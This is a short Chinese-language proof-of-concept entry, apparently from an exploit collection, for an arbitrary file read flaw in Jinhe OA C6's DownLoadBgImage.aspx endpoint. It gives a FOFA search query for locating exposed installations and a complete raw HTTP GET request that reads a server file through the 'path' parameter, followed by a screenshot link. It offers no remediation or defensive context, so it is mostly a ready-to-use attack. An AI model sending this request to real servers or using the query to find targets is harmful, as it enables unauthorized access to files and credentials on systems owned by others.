## 金和OA-C6接口DownLoadBgImage存在任意文件读取漏洞

金和OA `/C6/JHSoft.Web.AddMenu/LoginTemplate/DownLoadBgImage.aspx` 参数path可读取任意文件。

## fofa

```
body="JHSoft.Web.AddMenu" || app="金和网络-金和OA"
```

## poc

```
GET /C6/JHSoft.Web.AddMenu/LoginTemplate/DownLoadBgImage.aspx/?path=/C6/js/PasswordNew.js HTTP/1.1
Host: 
accept: */*
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Cookie: myie=false; sl-session=dFmseghQeWZR/amIUs1SMQ==; myie=false
Connection: close
```

![image-20240628211018935](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202406282110983.png)